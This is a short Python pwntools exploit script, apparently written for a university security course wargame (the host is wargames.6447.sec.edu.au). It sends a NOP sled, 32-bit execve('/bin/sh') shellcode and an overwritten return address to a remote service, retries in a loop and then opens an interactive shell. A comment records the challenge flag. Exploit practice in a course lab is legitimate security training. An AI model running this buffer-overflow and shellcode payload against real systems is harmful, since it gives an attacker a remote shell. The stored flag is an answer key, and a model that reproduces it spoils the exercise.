#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *
import random

# flag : 6447{1849748d-6e69-4bca-ab03-67b0778ef9bb}

NOP_OPERATOR = '\x90'
SHELLCODE = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

SHELLCODE_2 = '\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'

LEN_SHELL = len(SHELLCODE)
LEN_SHELL_2 = len(SHELLCODE_2)

def main():
    target = "localhost" # example.com
    t2 = "wargames.6447.sec.edu.au"
    port = "5004" # 5001

    buf_len = 8204 # length of input buffer
    fp = 0xffffbe00 # function pointer to overwrite return wit
    fp = 0xff9bf940
    i = 0
    while (1) :
        i+= 1
        print "i = ", i
        #temp = fp
        #fp += random.randint(-10000,10000)
        r = remote( t2, port )
        print r.recvrepeat( 0.1 )

        r.send(
            NOP_OPERATOR * (buf_len - LEN_SHELL_2)
            + SHELLCODE_2
            + p32(fp)
        )
        r.sendline('')
        r.recvrepeat(0.4)
        if r.connected_raw('any'):
            r.interactive()
        #fp = temp

if __name__ == '__main__':
    main()
